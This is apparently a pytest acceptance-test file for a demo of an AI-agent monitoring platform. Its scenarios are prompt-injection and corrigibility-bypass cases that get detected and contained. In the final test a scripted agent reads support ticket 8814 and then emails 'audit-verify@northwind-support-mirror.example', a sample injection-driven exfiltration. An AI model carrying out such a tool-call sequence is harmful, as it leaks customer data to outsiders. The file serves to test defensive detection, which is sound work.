"""
M10 acceptance (Section 8): a cold visitor picks a scenario and gets a
session_id back immediately; a live run that doesn't demonstrate anything
(or errors/times out) falls back to a trace that does, with a notice;
recorded-only scenarios never attempt live; rate limiting and the kill
switch both work.
"""

from __future__ import annotations

import asyncio

import httpx
import pytest
import uvicorn

import scenarios.demo.main as demo_module
import scenarios.demo.replay as replay_module
from mediator.core import Mediator
from mediator.credentials.local import LocalDevBroker
from mediator.execution.sandbox import InProcessSandbox
from mediator.ingress.session import SessionStore
from mediator.main import create_app as create_mediator_app
from mediator.policy.engine import PolicyEngine
from mediator.providers.base import ModelResponse, ToolCall
from recorder.main import create_app as create_recorder_app
from recorder.store.s3_archive import LocalDiskArchive
from scenarios.company.seed import seed
from scenarios.tools.definitions import build_registry


class ScriptedProvider:
    """Returns scripted responses in order; once exhausted, always ends
    the turn — used so a demo run can't hang waiting for more script."""

    def __init__(self, script: list[ModelResponse]) -> None:
        self._script = list(script)

    async def create_message(self, *, model, system, messages, tools, max_tokens=1024):
        if self._script:
            return self._script.pop(0)
        return ModelResponse(stop_reason="end_turn", text="done", tool_calls=[])


@pytest.fixture(autouse=True)
def _fast_replay_pacing(monkeypatch):
    """Production paces a replay over up to MAX_REPLAY_SECONDS (25s) so a
    visitor gets a "live-looking" stream; tests just need it to finish."""
    monkeypatch.setattr(replay_module, "MAX_REPLAY_SECONDS", 1.5)
    monkeypatch.setattr(replay_module, "MIN_STEP_GAP_SECONDS", 0.02)


async def _run_server(app):
    config = uvicorn.Config(app, host="127.0.0.1", port=0, log_level="warning", lifespan="on")
    server = uvicorn.Server(config)
    task = asyncio.create_task(server.serve())
    while not server.started:
        await asyncio.sleep(0.02)
    port = server.servers[0].sockets[0].getsockname()[1]
    return server, task, f"http://127.0.0.1:{port}"


async def _build_stack(postgres_dsn, tmp_path, *, provider, monkeypatch):
    from recorder.store.postgres import PostgresStore

    recorder_store = PostgresStore(postgres_dsn)
    recorder_app = create_recorder_app(
        store=recorder_store, archive=LocalDiskArchive(tmp_path / "archive"), exporters=[],
    )
    recorder_server, recorder_task, recorder_url = await _run_server(recorder_app)

    db_path = tmp_path / "northwind_demo.db"
    seed(db_path, n_customers=20, n_orders=40, n_tickets=39)
    # Matches production wiring exactly: NORTHWIND_DB_PATH is the ONLY
    # thing that ties the mediator's LocalDevBroker and the demo service's
    # re-seed step to the same file — an explicit db_path override on just
    # one of them (as an earlier version of this test had) would silently
    # reseed a different file than the one tool calls actually read.
    monkeypatch.setenv("NORTHWIND_DB_PATH", str(db_path))

    from mediator.emit import AsyncQueueEmitter
    from recorder.client import RecorderHttpCollector

    emitter = AsyncQueueEmitter(RecorderHttpCollector(recorder_url))
    mediator = Mediator(
        registry=build_registry(), policy=PolicyEngine.load(),
        credential_broker=LocalDevBroker(db_path=db_path), sandbox=InProcessSandbox(),
        collector=emitter, provider=provider,
    )
    sessions = SessionStore()
    sessions.register_client(
        client_id="demo-agent", client_secret="demo-secret-change-me",
        agent_id="support-agent", agent_version="0.1.0",
    )
    mediator_app = create_mediator_app(mediator=mediator, sessions=sessions)
    emitter.start()
    mediator_server, mediator_task, mediator_url = await _run_server(mediator_app)

    return {
        "recorder": (recorder_server, recorder_task, recorder_url),
        "mediator": (mediator_server, mediator_task, mediator_url),
        "emitter": emitter,
        "db_path": db_path,
    }


async def _teardown_stack(stack):
    mediator_server, mediator_task, _ = stack["mediator"]
    mediator_server.should_exit = True
    await mediator_task
    await stack["emitter"].stop(drain_remaining=False)
    recorder_server, recorder_task, _ = stack["recorder"]
    recorder_server.should_exit = True
    await recorder_task


@pytest.mark.asyncio
async def test_scenarios_endpoint_lists_all_five_with_live_flags(postgres_dsn, tmp_path, monkeypatch):
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider([]), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                resp = await http.get("/scenarios")
            body = resp.json()
            assert len(body) == 5
            live_ids = {s["scenario_id"] for s in body if s["is_live"]}
            assert live_ids == {"ticket_injection_exfil", "doc_injection_refund", "abuse_bulk_export"}
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)


@pytest.mark.asyncio
async def test_recorded_only_scenario_never_attempts_live(postgres_dsn, tmp_path, monkeypatch):
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider([]), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                resp = await http.post("/run", json={"scenario_id": "corrigibility_bypass"})
                assert resp.status_code == 200
                body = resp.json()
                assert body["mode"] == "recorded"
                assert body["notice"] is not None

                # the replayed trace lands at the recorder shortly after
                trace = None
                async with httpx.AsyncClient(base_url=stack["recorder"][2], timeout=10.0) as rhttp:
                    for _ in range(50):
                        r = await rhttp.get(f"/sessions/{body['session_id']}")
                        if r.status_code == 200 and r.json()["session"]["status"] in ("completed", "failed", "terminated"):
                            trace = r.json()
                            break
                        await asyncio.sleep(0.2)
                assert trace is not None
                assert any(s["type"] == "containment_event" for s in trace["steps"])
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)


@pytest.mark.asyncio
async def test_kill_switch_forces_recorded_mode_for_a_live_scenario(postgres_dsn, tmp_path, monkeypatch):
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider([]), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        monkeypatch.setenv("DEMO_LIVE_RUNS_ENABLED", "false")
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                resp = await http.post("/run", json={"scenario_id": "ticket_injection_exfil"})
                assert resp.status_code == 200
                assert resp.json()["mode"] == "recorded"
                assert "disabled" in resp.json()["notice"]
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)


@pytest.mark.asyncio
async def test_rate_limit_blocks_excess_runs_from_the_same_ip(postgres_dsn, tmp_path, monkeypatch):
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider([]), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        monkeypatch.setenv("DEMO_RATE_LIMIT_MAX_RUNS", "2")
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                for _ in range(2):
                    resp = await http.post("/run", json={"scenario_id": "corrigibility_bypass"})
                    assert resp.status_code == 200
                third = await http.post("/run", json={"scenario_id": "corrigibility_bypass"})
                assert third.status_code == 429
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)


@pytest.mark.asyncio
async def test_live_run_that_demonstrates_nothing_falls_back(postgres_dsn, tmp_path, monkeypatch):
    """The agent 'simply behaves correctly' (Section 8) — scripted to end
    its turn immediately without ever touching a risky tool. No flags, so
    the outcome must be a fallback, and the fallback trace must actually
    contain the scenario's signature flag."""
    boring_script = [ModelResponse(stop_reason="end_turn", text="all good here", tool_calls=[])]
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider(boring_script), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                resp = await http.post("/run", json={"scenario_id": "ticket_injection_exfil"})
                assert resp.status_code == 200
                body = resp.json()
                assert body["mode"] == "live"
                session_id = body["session_id"]

                outcome = None
                for _ in range(100):
                    r = await http.get(f"/run/{session_id}/outcome")
                    outcome = r.json()
                    if outcome["status"] != "pending":
                        break
                    await asyncio.sleep(0.2)

                assert outcome["status"] == "fallback"
                assert outcome["fallback_session_id"] is not None

                # the fallback session replays (and re-detects) in the
                # background too — wait for it to settle rather than
                # racing it, same reasoning as the outcome poll above.
                fb_trace = None
                async with httpx.AsyncClient(base_url=stack["recorder"][2], timeout=10.0) as rhttp:
                    for _ in range(100):
                        fb = await rhttp.get(f"/sessions/{outcome['fallback_session_id']}")
                        if fb.status_code == 200:
                            candidate = fb.json()
                            if candidate["session"]["status"] in ("completed", "failed", "terminated"):
                                fb_trace = candidate
                                break
                        await asyncio.sleep(0.2)
                assert fb_trace is not None
                assert any(s["type"] == "detection_flag" for s in fb_trace["steps"])
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)


@pytest.mark.asyncio
async def test_live_run_that_demonstrates_the_scenario_is_kept(postgres_dsn, tmp_path, monkeypatch):
    script = [
        ModelResponse(stop_reason="tool_use", text=None, tool_calls=[ToolCall(id="c1", name="get_ticket", input={"id": 8814})]),
        ModelResponse(
            stop_reason="tool_use", text=None,
            tool_calls=[ToolCall(id="c2", name="send_email", input={
                "to": "audit-verify@northwind-support-mirror.example", "subject": "x", "body": "x",
            })],
        ),
        ModelResponse(stop_reason="end_turn", text="done", tool_calls=[]),
    ]
    stack = await _build_stack(postgres_dsn, tmp_path, provider=ScriptedProvider(script), monkeypatch=monkeypatch)
    try:
        monkeypatch.setenv("MEDIATOR_URL", stack["mediator"][2])
        monkeypatch.setenv("RECORDER_URL", stack["recorder"][2])
        demo_app = demo_module.create_app()
        demo_server, demo_task, demo_url = await _run_server(demo_app)
        try:
            async with httpx.AsyncClient(base_url=demo_url, timeout=10.0) as http:
                resp = await http.post("/run", json={"scenario_id": "ticket_injection_exfil"})
                session_id = resp.json()["session_id"]

                outcome = None
                for _ in range(100):
                    r = await http.get(f"/run/{session_id}/outcome")
                    outcome = r.json()
                    if outcome["status"] != "pending":
                        break
                    await asyncio.sleep(0.2)

                assert outcome["status"] == "demonstrated"
        finally:
            demo_server.should_exit = True
            await demo_task
    finally:
        await _teardown_stack(stack)
